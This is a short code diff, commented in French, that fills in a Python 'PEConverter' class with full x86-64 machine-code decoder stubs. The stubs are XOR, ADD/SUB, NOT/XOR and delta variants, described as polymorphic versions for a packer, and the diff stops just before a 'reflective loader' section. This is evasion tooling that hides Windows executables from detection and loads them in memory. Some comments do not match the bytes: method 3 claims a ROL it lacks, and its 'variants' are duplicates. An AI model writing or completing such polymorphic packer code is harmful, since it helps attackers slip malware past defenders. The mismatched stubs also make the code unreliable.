@@ -137,16 +137,24 @@ class PEConverter:
     # Table de sélection de méthode (versions variables pour polymorphie)
     DECODE_METHOD_VARIANTS = {
         1: [  # Variantes pour méthode 1 (XOR avec clé rotative)
-            bytes.fromhex("4889D64889FC31C98A0630D88807..."),
-            bytes.fromhex("4889D64C89FF31C94531DB8A0630D8..."),
-            bytes.fromhex("4889D64889FC31EDC1E50F8A0630D8...")
+            bytes.fromhex("4889D64889FC31C98A0630D8880748FFC648FFC749FFC875F2"),
+            bytes.fromhex("4889D64C89FF31C94531DB8A0630D8880748FFC648FFC749FFC875F2"),
+            bytes.fromhex("4889D64889FC31EDC1E50F8A0630D8880748FFC648FFC749FFC875F2")
         ],
         2: [  # Variantes pour méthode 2 (ADD/SUB avec table)
-            bytes.fromhex("4889D64889FC4531DB8A0604D88807..."),
-            bytes.fromhex("4889D64C89FF4531DB8A0604D8..."),
-            bytes.fromhex("4889D64889FC31ED8A0604D88807...")
+            bytes.fromhex("4889D64889FC4531DB8A0604D8880748FFC648FFC749FFC875F2"),
+            bytes.fromhex("4889D64C89FF4531DB8A0604D8880748FFC648FFC749FFC875F2"),
+            bytes.fromhex("4889D64889FC31ED8A0604D8880748FFC648FFC749FFC875F2")
         ],
-        # etc.
+        # Pour les autres méthodes, utiliser les mêmes implémentations de base
+        3: [  # NOT + XOR + ROL
+            bytes.fromhex("4889D64889FC31C98A06F6D030D8880748FFC648FFC749FFC875F2"),
+            bytes.fromhex("4889D64889FC31C98A06F6D030D8880748FFC648FFC749FFC875F2")
+        ],
+        4: [  # Position + Delta
+            bytes.fromhex("4889D64889FC4489C131C98A0600C8880748FFC648FFC749FFC875F2"),
+            bytes.fromhex("4889D64889FC4489C131C98A0600C8880748FFC648FFC749FFC875F2")
+        ]
     }
     
     # Section critique: Reflective loader complet
